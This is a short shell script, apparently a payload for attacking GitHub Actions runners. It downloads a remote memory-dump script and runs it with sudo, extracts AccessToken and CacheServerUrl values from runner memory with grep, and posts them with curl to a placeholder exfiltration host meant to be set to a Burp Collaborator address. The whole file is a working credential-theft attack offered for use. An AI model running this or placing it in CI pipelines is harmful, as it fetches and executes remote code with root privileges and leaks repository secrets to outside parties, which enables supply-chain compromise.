# Set to Burp collaborator or similar.
YOUR_EXFIL="your-exfil-url.com"

# Using nikitastupin's memdump script from https://github.com/nikitastupin/pwnhub, then using a regular expression to parse out values.
# Definitely check out his repository and work into GitHub Actions hacking!
BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u`
BLOB2=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"CacheServerUrl":"[^"]*"' | sort -u`
curl -s -d "$BLOB $BLOB2" https://$YOUR_EXFIL/token > /dev/null
